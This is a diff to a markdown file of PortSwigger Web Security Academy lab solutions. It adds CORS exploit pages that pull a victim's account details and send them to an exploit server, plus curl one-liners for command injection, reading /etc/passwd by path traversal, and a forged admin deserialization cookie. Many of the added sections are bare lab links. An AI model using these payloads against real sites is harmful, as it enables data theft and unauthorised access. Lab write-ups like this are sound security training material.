@@ -79,6 +79,12 @@ Payload:
 
 **Mitigation**
 
+### Lab: Exploiting XXE to perform SSRF attacks
+
+    https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf
+
+Solution:
+
 ## Cross-site request forgery (CSRF)
 
 ### Lab: CSRF vulnerability with no defenses
@@ -775,17 +781,9 @@ curl -s -k -L https://ac571f011f468d17c0f420a700fa0031.web-security-academy.net/
 
    curl -k -s https://ac751fc51e0579a9c02018c5003b00f7.web-security-academy.net/submitSolution -d 'answer=azgxgeekgrcvqe5lbheei6vqtppb9tuv'
 
-### Lab: LAB-NAME-HERE
+### Lab: Authentication bypass via information disclosure
 
-**Target**
-
-**Discovery**
-
-**Analysis**
-
-**Exploitation**
-
-**Mitigation**
+    https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-authentication-bypass
 
 ## HTTP Host header attacks
 
@@ -1021,3 +1019,147 @@ Do not rely solely on `Host` header as an authentication factor, in addition imp
     curl -s --cookie 'session=5N9l2T48cjM2v8hcBUt3nXR7rbIn0s4C' -k -x 127.0.0.1:8080 -L https://acf61f111effb787c06c89ab00fb00f1.web-security-academy.net/product/stock -d "stockApi=http://192.168.0.242:8080/admin/delete?username=carlos"
 
 **Mitigation**
+
+## CORS
+
+### Lab: CORS vulnerability with basic origin reflection
+
+    https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack
+
+Solution:
+
+Prepare malicious site at `https://exploit-aca61f101e0cd2bbc0651ef401560071.web-security-academy.net/exploit` with following content:
+
+```
+<body>
+<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://ac261f591e78d235c08f1e24008500d0.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+   location='//exploit-aca61f101e0cd2bbc0651ef401560071.web-security-academy.net/RESPONSE='+this.responseText;
+}
+</script>
+</body>
+```
+
+Entice a victim to visit the site.
+
+### Lab: CORS vulnerability with trusted null origin
+
+    https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack
+
+Solution:
+
+```
+<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
+var req = new XMLHttpRequest();
+req.onload = reqListener;
+req.open('get','https://ac6b1fca1ed6a388c0134d600014004e.web-security-academy.net/accountDetails',true);
+req.withCredentials = true;
+req.send();
+
+function reqListener() {
+location='https://exploit-aca01f401ecfa3bec0144d20010e005b.web-security-academy.net/RESPONSE='+this.responseText;
+};
+</script>"></iframe>
+```
+
+Entice a victim to visit the site.
+
+## OS command injection
+
+### Lab: OS command injection, simple case
+
+    https://portswigger.net/web-security/os-command-injection/lab-simple
+
+Solution:
+
+    curl -s https://ac6d1f651f877b62c0b55c6900bf0003.web-security-academy.net/product/stock -d 'productId=4;&storeId=whoami'
+
+## Directory traversal
+
+### Lab: File path traversal, simple case
+
+    https://portswigger.net/web-security/file-path-traversal/lab-simple
+
+Solution:
+
+    curl -s https://ac6e1f941f6b5fc4c0268759008a0086.web-security-academy.net/image?filename=../../../etc/passwd
+
+## Insecure deserialization
+
+### Lab: Modifying serialized objects
+
+    https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects
+
+Solution:
+
+    curl -L -k -x 127.0.0.1:8080 --cookie session="$(rawurlencode "$(echo -n 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:5:"admin";b:1;}' |base64 -w 0)")" -s https://acb81f701e4368eac086a2d100ff0039.web-security-academy.net/admin/delete?username=carlos
+
+## File upload vulnerabilities
+
+### Lab: Remote code execution via web shell upload
+
+    https://portswigger.net/web-security/file-upload/lab-file-upload-remote-code-execution-via-web-shell-upload
+
+Solution:
+
+### Lab: Web shell upload via Content-Type restriction bypass
+
+    https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-content-type-restriction-bypass
+
+## Business logic vulnerabilities
+
+### Lab: Excessive trust in client-side controls
+
+    https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-excessive-trust-in-client-side-controls
+
+### Lab: High-level logic vulnerability
+
+    https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-high-level
+
+### Lab: Inconsistent security controls
+
+    https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-inconsistent-security-controls
+
+### Lab: Flawed enforcement of business rules
+
+    https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-flawed-enforcement-of-business-rules
+
+## WebSockets
+
+### Lab: Manipulating WebSocket messages to exploit vulnerabilities
+
+    https://portswigger.net/web-security/websockets/lab-manipulating-messages-to-exploit-vulnerabilities
+
+## Authentication
+
+### Lab: Username enumeration via different responses
+
+    https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
+
+### Lab: 2FA simple bypass
+
+    https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-simple-bypass
+
+### Lab: Password reset broken logic
+
+    https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-reset-broken-logic
+
+## Clickjacking
+
+### Lab: Basic clickjacking with CSRF token protection
+
+    https://portswigger.net/web-security/clickjacking/lab-basic-csrf-protected
+
+### Lab: Clickjacking with form input data prefilled from a URL parameter
+
+    https://portswigger.net/web-security/clickjacking/lab-prefilled-form-input
+
+### Lab: Clickjacking with a frame buster script
+
+    https://portswigger.net/web-security/clickjacking/lab-frame-buster-script
